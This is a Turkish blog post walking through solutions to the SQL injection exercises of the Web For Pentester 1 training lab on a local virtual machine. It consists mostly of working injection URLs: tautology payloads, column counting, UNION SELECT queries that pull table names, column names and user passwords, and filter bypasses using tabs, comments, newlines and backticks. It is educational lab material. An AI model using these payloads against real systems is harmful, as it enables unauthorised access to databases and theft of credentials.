---
layout: post
title: WEB For Pentester 1 - SQL Injections Bölümü Çözümleri
categories: tr
---



&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>Web For Pentester</strong> yaygın Web zafiyetlerini bize sunan ve bu zafiyetlerden yararlanmaya çalışarak çözümlere ulaştığımız
bir test sistemidir. <a href = "https://www.pentesterlab.com/exercises/web_for_pentester">Bu</a> adresten bilgisayarınıza indirebilirsiniz.
ISO kalıbı bilgisayarınıza indikten sonra Vmware,Virtual Machine gibi sanal makina sistemlerinden birine kurmanız gerekir. Kurulumdan sonra sanal makinenizdeki sistem de ;

>><strong>>>ifconfig</strong>

yazarak gördüğünüz IP adresini ana makinenizdeki tarayıcınıza yazarak <strong>WFP</strong> sorularına ulaşabilirsiniz.
Bu yazıda <strong>SQL Injections</strong> bölümünün çözümlerini anlatmaya çalışacağım.Syntax yapısını sağlamak için gereken  URL encode karakterlerine de ;
<a href = "https://www.w3schools.com/tags/ref_urlencode.asp">şurayı</a>	ziyaret ederek ulaşabilirsiniz.


<strong>Example 1</strong><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Soruda tırnak (') koyup deneme yaptığımızda ekranın bir hatadan dolayı değiştiğini görüyoruz. Buradan araya kod sıkıştırabileceğimizi anlıyoruz.  Örnek olarak arka tarafta çalışan sorgu:

	1. select id,name,age from users where name='root'

Buraya şu ifadeyi eklediğimizde ;

	1. select id,name,age from users where name='root' or 1 or''
	2. select id,name,age from users where 1 

İkinci  duruma geldiğini düşünebiliriz. Bununla bütün değerleri çağırmış oluyoruz ve listeliyoruz.
'or 1 or' ifadesini aşağıdaki gibi URL'ye eklediğimizde tüm tabloyu listeliyoruz. 

	1. http://192.168.96.129/sqli/example1.php?name=root'or 1 or'

Burada çıkan kullanıcıları ve bilgileri görüyoruz. Örneğin user1 ile devam edelim. Buraya yazdığımız kelime sonucu etkilemez. Önümüzdeki tabloda kaç tane sütun olduğunu aşağıdaki komutla deneyerek buluyoruz.

	1. http://192.168.96.129/sqli/example1.php?name=user1' order by 1 %23
	2. http://192.168.96.129/sqli/example1.php?name=user1' order by 2 %23
	3. http://192.168.96.129/sqli/example1.php?name=user1' order by 3 %23
	4. http://192.168.96.129/sqli/example1.php?name=user1' order by 4 %23
	5. http://192.168.96.129/sqli/example1.php?name=user1' order by 5 %23
	6. http://192.168.96.129/sqli/example1.php?name=user1' order by 6 %23

En son 6 da hata oluyor yani önümüze hiç bir şey çıkmıyor. Buradan 5 tane sütunumuz olduğunu anlıyoruz.<strong>'%23'</strong> ifadesi de (#) anlamına geliyor yani sonrasında gelen ifadeleri yok sayıyor. Bu sayede syntax hatalarından kurtuluyoruz.
Bu aşamadan sonra bilgi toplamaya başlıyoruz.İlk sütuna ve ikinci sütuna tablo ve versiyon bilgilerini bastırmak için aşağıdaki işlemi uyguluyoruz.

	1. http://192.168.96.129/sqli/example1.php?name=user1' union select table_name,version(),3,4,5 
	from information_schema.tables %23


Bütün Sütun isimleri için ;

	1. http://192.168.96.129/sqli/example1.php?name=user1' union select column_name,2,3,4,5 
	from information_schema.columns %23

Tablo isimlerini normal yazarak hata alırsak onların hexadecimal karşılıklarını deneyerek sonuca ulaşabiliriz.

	1. http://192.168.96.129/sqli/example1.php?name=root' union select column_name,2,3,4,5 
	from information_schema.columns where table_name = 0x7573657273 %23

Sırayla aşağıdaki işlemleri uygulayarak tablodaki kullanıcı şifrelerini bulmaya çalışalım.

	1. http://192.168.96.129/sqli/example1.php?name=root' union select 
	database(),2,3,4,5 %23 --> Kullanılan veri tabanının ismini çektiğimiz komut.

	2. http://192.168.96.129/sqli/example1.php?name=root' union select table_name,2,3,4,5 
	from information_schema.tables where 
	table_schema = database() %23 --> Kullanılan tablonun adını çektiğimiz komut.

	3. http://192.168.96.129/sqli/example1.php?name=root' UNION SELECT 1,column_name,3,4,5 
	FROM information_schema.columns WHERE table_name="users" %23 --> tablodaki sütunların 
	isimlerini çektiğimiz komut.

	4. http://192.168.96.129/sqli/example1.php?name=root' union select name,passwd,3,4,5 
	from exercises.users %23 --> kullanıcı isimlerini ve şifrelerini çektiğimiz komut.


Çeşitli komut varyasyonları ile farklı bilgiler edinebiliriz. 



<strong>Example 2</strong><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;1. Soruda denediğimiz ifadenin aynısını deniyoruz ve <strong>'ERROR NO SPACE'</strong> yazısını görüyoruz. Buradan aralara
koyduğumuz boşluk karakterinin sorun oluşturduğunu anlıyoruz.  Syntax yapısını sağlamak için boşluk yerine tab koyabiliriz. Tabiki Tab tuşuna basarak yapabildiğimiz bir olay değil. TAB karakteri <strong>'%09'</strong> ile ifade edilir.
	
	1. http://192.168.96.129/sqli/example2.php?name=root'or%091%09or'	


<strong>Example 3</strong><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;'or 1 or' denediğimizde  <strong> 'ERROR NO SPACE' </strong> hatasını görüyoruz. Sonrasında bir önceki sorudaki gibi  'or%091%09or' deniyoruz fakat yine aynı sonuç : <strong>'ERROR NO SPACE'</strong> . Boşluğa ve tab'a izin vermiyor. Syntax yapısını sağlaması için boşluk benzeri birşey koyacağız ama ne boşluk olacak ne de tab. Biraz araştırma sonucu yorum satırı haline getirerek oralardaki karakter koyma ihtiyacından kurtuluyoruz.

	1. http://192.168.96.129/sqli/example3.php?name=root'or/**/1/**/or


<strong>Example 4</strong><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;URL'nin devamına 'or 1 or' denediğimizde bir sonuç alamıyoruz. Birkaç denemeden sonra tırnak karakteri kullanmamamız gerektiğini anlıyoruz ve yalnızca <strong>or 1</strong> yazarak sonuçlari listeliyoruz.

	1. http://192.168.96.129/sqli/example4.php?id=2 or 1


<strong>Example 5</strong><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;4. soruda olduğu gibi aynı işlemi uygulayınca sonucu listeliyoruz.

	1. http://192.168.96.129/sqli/example5.php?id=2 or 1


<strong>Example 6</strong><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Tırnak koyup kontrol ediyoruz ve <strong>'ERROR INTEGER REQUIRED'</strong> yazısını görüyoruz. İfademizi bir Integer ile bitirmek için  or 1  yazıyoruz .

	1. http://192.168.96.129/sqli/example6.php?id=2 or 1


<strong>Example 7</strong><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Tırnak karakteri koyduğumuzda <strong>'ERROR INTEGER REQUIRED'</strong> yazısını görüyoruz. Bir önceki soruda olduğu gibi or 1 yazıp deniyoruz ama aynı hata devam ediyor. Burada integer isteyen yerin bizim ifademizden önce gelen yer olduğunu deneyerek buluyoruz.<strong>'%0A'</strong> karakteri alt satıra geçme anlamına geliyor. Bunu kullanarak aşağıdaki ifade sonuçları listeliyor.

	1. http://192.168.96.129/sqli/example7.php?id=2%0A or 1

<strong>Example 8</strong><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Burada <strong>order</strong> kelimesini görünce order yapısıyla ilgili sorgular göndermeye çalışıyoruz. Düz tırnak gönderdiğimizde bir sonuç alamıyoruz ve denemeler sonucu yatay tırnak(`) kullanıyoruz.

	1. `asc %23
	2. `desc %23
	3. ` %23

ifadeleri işimizi görüyor.

	1. http://192.168.96.129/sqli/example8.php?order=name`asc %23

<strong>Example 9</strong><br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Düz tırnak ve yatay tırnak karakterleri hata veriyor ve bunları kullanmadan deneyerek sonuçları listeliyoruz.
 
	1. asc %23
	2. desc %23
	3. %23

İfadelerinden herhangi biriyle sorgumuzu çalıştırıyoruz.

	1. http://192.168.96.129/sqli/example9.php?order=name desc %23

<br>
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Böylelikle <strong>WEB For Pentester 1 SQL Injections</strong> bölümünün çözümünü tamamlamış olduk. Tüm sorular için aynı detaya inme gereği duymadım ilk sorudaki sorgulardan yola çıkarak aynı sonuçları elde edebilirsiniz.








